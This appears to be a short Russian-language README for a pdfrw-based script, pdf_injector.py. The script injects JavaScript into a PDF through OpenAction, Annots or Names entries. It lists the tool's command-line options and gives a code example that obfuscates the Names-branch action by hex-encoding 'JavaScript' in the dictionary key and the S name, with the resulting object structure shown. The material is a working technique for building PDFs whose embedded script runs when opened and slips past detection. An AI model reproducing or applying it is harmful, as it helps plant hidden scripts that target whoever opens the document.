# Inject-JavaScript-via-PDFrw-example

- Запуск с параметрами по умолчанию:

`pdf_injector.py path/to/orig.pdf`

- Все параметры:

`        pdf_injector.py path/to/orig.pdf
        -n      ScriptName
        -o      path/to/out.pdf
        ( -S      path/to/script | 
        -s      someJSScript() )
        -i      [OpenAction | Annots | Names]`

- Пример действия в ветке Names с обфускацией:

```
names = IndirectPdfDict(**{"J#61vaScript": IndirectPdfDict(
        Names=[PdfString(script_name), IndirectPdfDict(JS=PdfString(script_code), S=PdfName('4A617661536372697074'))]
        )})
```

- Результат:

`/Names (Indirect Dict 1)` --> 

(Indirect Dict 1)

`<</J#61vaScript (Indirect Dict 2)>>` --> 

(Indirect Dict 2)

`<< /Names [(script_name), (Indirect Dict 3)` -->

(Indirect Dict 3)

`<< /JS: (script_code;), /S: /4A617661536372697074>>]>>`
